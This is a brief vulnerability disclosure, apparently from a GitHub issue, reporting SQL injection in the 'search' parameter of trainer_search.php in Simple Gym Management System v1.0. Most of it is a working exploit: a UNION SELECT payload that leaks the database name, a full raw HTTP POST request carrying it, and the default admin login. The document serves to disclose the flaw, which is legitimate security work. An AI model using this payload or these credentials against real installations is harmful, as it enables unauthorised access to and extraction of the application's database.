# Simple Gym Management Syste v1.0 by code-projects has SQL injection 5

BUG_Author: Zhang Qi

Login account: admin/pass

vendors: https://code-projects.org/simple-gym-management-system-in-php-with-source-code/

The program is built using the xmapp-php8.1 version

dbname=loginsystem

Vulnerability File: /gym/trainer_search.php

Vulnerability location: /gym/trainer_search.php, search

[+] Payload: search=-1' union select 1,database(),3,4,5#&patient_search_submit=Search // Leak place ---> search

```sql
POST /gym/trainer_search.php HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=1lo81k0mv3p5cfonn5hopvoht6
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

search=-1' union select 1,database(),3,4,5#&patient_search_submit=Search
```

<img width="1623" height="871" alt="image" src="https://github.com/user-attachments/assets/fdc977e3-b228-4782-a47e-91750fa14636" />
